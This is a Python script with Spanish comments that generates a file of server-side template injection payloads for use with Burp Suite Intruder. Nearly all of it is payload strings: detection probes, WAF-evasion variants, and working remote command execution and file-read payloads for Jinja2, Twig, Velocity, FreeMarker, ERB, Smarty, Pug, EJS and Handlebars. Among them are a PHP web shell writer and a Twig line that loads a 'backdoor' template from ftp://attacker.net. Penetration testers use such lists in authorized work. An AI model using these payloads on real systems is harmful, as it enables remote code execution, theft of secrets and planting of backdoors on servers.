#!/usr/bin/python3
"""
Script generador de payloads para SSTI
Diseñado para crear una lista de payloads para usar con Burp Suite Intruder
Autor: lxbx
"""

import os

def write_to_file(filename, payloads):
    with open(filename, 'w') as f:
        for payload in payloads:
            f.write(payload + '\n')
    print(f"[+] {len(payloads)} payloads escritos en {filename}")

def generate_detection_payloads():
    """Genera payloads básicos para detección de vulnerabilidad SSTI"""
    
    payloads = [
        # Operaciones matemáticas básicas
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "${{7*7}}",
        "*{7*7}",
        "@(7*7)",
        "#set($x=7*7)${x}",
        
        # Multiplicación de string - identifica Jinja2/Twig
        "{{7*'7'}}",
        "${7*'7'}",
        "<%= 7*'7' %>",
        
        # Concatenación
        "{{'a'+'b'}}",
        "${{'a'+'b'}}",
        "${'a'+'b'}",
        "<%= 'a'+'b' %>",
        
        # Llamadas a funciones
        "{{''.__class__.__name__}}",
        "${''.__class__.__name__}",
        "<%= ''.__class__.__name__ %>",
        
        # Condicionales 
        "{% if 7*7==49 %}VULNERABLE{% endif %}",
        "#if(7*7==49)VULNERABLE#end",
        "${7*7==49 ? 'VULNERABLE' : ''}",
        "<#if 7*7==49>VULNERABLE</#if>",
        
        # Operaciones con errores (división por cero)
        "{{1/0}}",
        "${1/0}",
        "<%= 1/0 %>",
        
        # Acceso a objetos/propiedades específicas
        "{{request}}",
        "{{self}}",
        "{{config}}",
        "{{_self}}",
        "${request}",
        "${session}",
        
        # Variables de entorno
        "{{environ}}",
        "{{_context}}",
        "{{_env}}",
        
        # Versiones específicas para diferentes motores
        "{$smarty.version}",
        "{{settings.SECRET_KEY}}",
        "{{toJSON settings}}",
        "${GLOBAL_SETTINGS}",
        "${SPRING_PROPERTIES}",
        
        # Sintaxis alternativa para eludir filtros
        "${{<%[%'}}%\\",
        "{{config|safe}}",
        "{{g.get('builtins').get('__import__')('os').popen('id').read()}}",
        "{{request|attr('application')|attr('__globals__')}}",
        
        # Payloads con unicode
        "{{'\u0065\u0076\u0061\u006c'}}",
        "${'\u0065\u0076\u0061\u006c'}",
        
        # Delimitadores personalizados
        "<#--{{7*7}}-->",
        "<!--${7*7}-->",
        "/* {{7*7}} */",
        
        # Payloads para identificar WAF
        "{{ '7'*7 }}",
        "{{ \"7\"*7 }}",
        "{{ 7*'7' }}",
        "{{ 7*\"7\" }}",
        
        # SSTI con URL-encoding
        "%7B%7B7*7%7D%7D",
        "%24%7B7*7%7D",
        "%3C%25%3D%207*7%20%25%3E",
        
        # Payloads específicos por framework
        "{{url_for.__globals__}}",  # Flask
        "{{url_for.__globals__.__builtins__}}",  # Flask
        "{{get_flashed_messages.__globals__}}",  # Flask
        "{{request.application.__globals__}}",   # Flask
        "${spring}",                # Spring
        "${applicationScope}",      # JSP
        "{{fn:toLowerCase('SSTI')}}",  # JSP EL
        "${T(java.lang.System).getenv()}",  # SpringEL
        
        # Payload con nonce para identificar la ejecución
        "{{9*9}}UNIQUE_ID_12345",
        "${9*9}UNIQUE_ID_12345",
        "<%= 9*9 %>UNIQUE_ID_12345",
        
        # Payloads con múltiples vectores
        "{{7*7}}${{7*7}}<%=7*7%>${7*7}#{7*7}",
        
        # Combinaciones que puedan saltar algunos filtros
        "{{[7]*7}}",
        "{{''.join([chr(55)]*7)}}",
        "${\"${7*7}\"}",
        "{${7*7}}",
        
        # Decodificando para evadir filtros
        "{{''.join([chr(55+0),'*',chr(55+0)])}}",
        "{{\"\".__class__}}"
    ]
    
    return payloads

def generate_jinja2_payloads():
    """Genera payloads específicos para vulnerabilidades en Jinja2/Flask"""
    
    payloads = [
        # Identificación básica
        "{{7*7}}",
        "{{7*'7'}}",
        "{{config}}",
        "{{config.items()}}",
        "{{request}}",
        "{{request.environ}}",
        "{{url_for}}",
        
        # Exploración de clases
        "{{''.__class__}}",
        "{{''.__class__.__mro__}}",
        "{{''.__class__.__mro__[1]}}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.__class__}}",
        "{{request.__class__.__mro__}}",
        
        # Acceso a builtins
        "{{url_for.__globals__}}",
        "{{url_for.__globals__['__builtins__']}}",
        "{{url_for.__globals__.__builtins__}}",
        "{{request.application.__globals__.__builtins__}}",
        
        # Acceso a módulos
        "{{url_for.__globals__['os']}}",
        "{{request.application.__globals__['os']}}",
        "{{config.__class__.__init__.__globals__['os']}}",
        
        # Recorrido de subcalses para encontrar vulnerabilidades
        "{% for x in ''.__class__.__mro__[1].__subclasses__() %}{{x.__name__}}:{{loop.index}}, {% endfor %}",
        
        # Ataques con distintas rutas de explotación
        "{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[41]('/etc/passwd').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[42]('/etc/passwd').read()}}",
        "{{''.__class__.__mro__[1].__subclasses__()[43]('/etc/passwd').read()}}",
        
        # Usando attr() para bypass
        "{{request|attr('application')|attr('__globals__')}}",
        "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')}}",
        "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}",
        
        # Bypasses usando caracteres Unicode y hex
        "{{request|attr('\\x5f\\x5fclass\\x5f\\x5f')}}",
        "{{request.__class__.__mro__[1].__subclasses__()[357].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}",
        
        # Otras variaciones
        "{{cycler.__init__.__globals__.os.popen('id').read()}}",
        "{{joiner.__init__.__globals__.os.popen('id').read()}}",
        "{{namespace.__init__.__globals__.os.popen('id').read()}}",
    ]
    
    return payloads

def generate_twig_payloads():
    """Genera payloads para Twig (PHP)"""
    
    payloads = [
        "{{_self}}",
        "{{_self.env}}",
        "{{_context}}",
        "{{_context|json_encode()}}",
        "{{dump(_context)}}",
        "{{dump(app)}}",
        "{{app.request.server.all|join(',')}}",
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
        "{{['id']|filter('system')}}",
        "{{_self.env.setCache('ftp://attacker.net:2121')}}{{_self.env.loadTemplate('backdoor')}}"
    ]
    
    return payloads

def generate_velocity_payloads():
    """Genera payloads para Velocity (Java)"""
    
    payloads = [
        "#set($x='')$x.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('id')",
        "#set($x='')\n$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')",
        "#set($str=$class.inspect('java.lang.String').type)\n#set($chr=$class.inspect('java.lang.Character').type)\n#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end"
    ]
    
    return payloads

def generate_freemarker_payloads():
    """Genera payloads para FreeMarker (Java)"""
    
    payloads = [
        "<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}",
        "${\"freemarker.template.utility.Execute\"?new()('id')}",
        "<#assign cmd=\"freemarker.template.utility.Execute\"?new()>${cmd('id')}",
        "${\"freemarker.template.utility.ObjectConstructor\"?new()('java.lang.ProcessBuilder', {'sh','-c','id'}).start()}"
    ]
    
    return payloads

def generate_erb_payloads():
    """Genera payloads para Ruby ERB"""
    
    payloads = [
        "<%= 7*7 %>",
        "<%= File.open('/etc/passwd').read %>",
        "<%= system('id') %>",
        "<%= `id` %>",
        "<%= IO.popen('id').read %>",
        "<%= require('open3').popen3('id'){|i,o,e,t| o.read } %>"
    ]
    
    return payloads

def generate_various_payloads():
    """Genera payloads para varios motores menos comunes"""
    
    payloads = [
        # Smarty
        "{php}echo `id`;{/php}",
        "{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}",
        
        # Jade/Pug
        "#{function(){return require('child_process').execSync('id').toString()}()}",
        
        # EJS
        "<% require('child_process').exec('id', function(error, stdout, stderr) { %><%- stdout %><%}); %>",
        
        # Mustache/Handlebars
        "{{#with \"s\" as |string|}}\n  {{#with \"e\"}}\n    {{#with split as |conslist|}}\n      {{this.push (lookup string.constructor (concat \"constructor\"))}}\n      {{this.pop}}\n      {{#with string.constructor.apply as |exec|}}\n        {{exec null conslist}}\n      {{/with}}\n    {{/with}}\n  {{/with}}\n{{/with}}"
    ]
    
    return payloads

def generate_waf_bypass_payloads():
    """Genera payloads diseñados para evadir WAF"""
    
    payloads = [
        # Codificación hexadecimal
        "{{\"\\x22\\x2e\\x5f\\x5f\\x63\\x6c\\x61\\x73\\x73\\x5f\\x5f\\x22\"}}",
        
        # Uso de atributos dinámicos
        "{{request|attr(\"_\"+(\"_\")+\"class\"+(\"_\")+\"_\")}}",
        
        # División de strings
        "{{'__cla'+'ss__'}}",
        
        # Uso de getitem
        "{{request.__class__['__mro__'][1]['__subclasses__']()[40]('/etc/passwd')['read']()}}",
        
        # Uso de array
        "{{request['__class__']['__mro__'][1]['__subclasses__']()[40]('/etc/passwd')['read']()}}",
        
        # Uso de diccionarios
        "{{dict(cls=request.__class__).__getitem__('cls').__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
        
        # Uso de _()
        "{{().__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}",
        
        # Uso de [].__class__
        "{{[].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()}}",
        
        # Uso de funciones str
        "{{''.join(['c','a','t',' ','/','e','t','c','/','p','a','s','s','w','d'])}}",
        
        # Anidamiento para confundir WAFs
        "{{{request|attr(request.args.usc*2+request.args.class+request.args.usc*2)|attr(request.args.mro)|attr(request.args.getitem)(1)|attr(request.args.subclasses)()|attr(request.args.getitem)(40)('/etc/passwd')|attr(request.args.read)()}}",
        
        # ASCII conversion
        "{{(request|attr(\"application\")|attr(\"\".join([chr(95),chr(95),chr(103),chr(108),chr(111),chr(98),chr(97),chr(108),chr(115),chr(95),chr(95)])))}}"
    ]
    
    return payloads

def generate_all_payloads():
    """Combina todos los payloads y elimina duplicados"""
    
    payloads = []
    payloads.extend(generate_detection_payloads())
    payloads.extend(generate_jinja2_payloads())
    payloads.extend(generate_twig_payloads())
    payloads.extend(generate_velocity_payloads())
    payloads.extend(generate_freemarker_payloads())
    payloads.extend(generate_erb_payloads())
    payloads.extend(generate_various_payloads())
    payloads.extend(generate_waf_bypass_payloads())
    
    # Eliminar duplicados manteniendo el orden
    unique_payloads = []
    seen = set()
    for payload in payloads:
        if payload not in seen:
            seen.add(payload)
            unique_payloads.append(payload)
    
    return unique_payloads

def main():
    # Generar todos los payloads
    all_payloads = generate_all_payloads()
    
    # Guardar en un solo archivo
    write_to_file('ssti_payloads.txt', all_payloads)
    
    print("[+] Generación completa. Archivo 'ssti_payloads.txt' creado con éxito.")
    print("[+] Total de payloads únicos: " + str(len(all_payloads)))

if __name__ == "__main__":
    main()
